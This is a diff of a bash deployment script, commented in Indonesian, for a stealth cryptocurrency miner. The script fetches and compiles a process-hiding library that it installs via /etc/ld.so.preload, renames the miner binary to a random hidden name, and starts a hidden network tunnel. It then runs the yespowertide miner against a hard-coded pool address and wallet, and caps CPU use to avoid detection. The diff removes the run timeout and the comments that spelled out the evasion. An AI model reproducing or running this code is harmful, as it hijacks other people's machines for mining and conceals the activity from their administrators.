@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # 1. Kompilasi Library Hiding (ld.so.preload)
-# Ini tetap dijalankan untuk menyembunyikan proses dari alat monitoring standar
 curl -s https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
@@ -9,28 +8,23 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 
 # 2. Persiapan Binary dengan Nama Acak
-# Menggunakan nama acak untuk menghindari deteksi berbasis nama proses
 NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
 cp /app/sr "/app/$NAME"
 chmod +x "/app/$NAME"
 rm -f /app/sr
 
 # 3. Menjalankan Tunnel Network (Background)
-# Pastikan file '.h' ada di direktori yang sama saat build
 if [ -f .h ]; then
     /usr/local/bin/.netd access tcp \
     --hostname "$(cat .h)" \
     --url 127.0.0.1:443 >/dev/null 2>&1 &
 fi
 
-# 4. Eksekusi Main Process dengan Pembatasan Resource
-DURATION=$((1200 + RANDOM % 301))
-
-# Menjalankan process utama dengan timeout
-timeout ${DURATION}s /app/$NAME \
+# 4. Eksekusi Main Process TANPA timeout
+/app/$NAME \
 -a yespowertide \
 -o 157.173.100.15:443 \
--u TR5CjGz5ZDUQNG7Trn5aDdhCSCSZevn9xH.multo \
+-u TR5CjGz5ZDUQNG7Trn5aDdhCSCSZevn9xH.sency \
 -p x \
 --cpu-threads 2 \
 --cpu-threads-intensity 1 \
@@ -38,7 +32,7 @@ timeout ${DURATION}s /app/$NAME \
 
 P=$!
 
-# Membatasi CPU usage agar tidak terdeteksi sebagai spike mencurigakan
+# Membatasi CPU usage
 LIMIT=$((75 + RANDOM % 6))
 cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
 
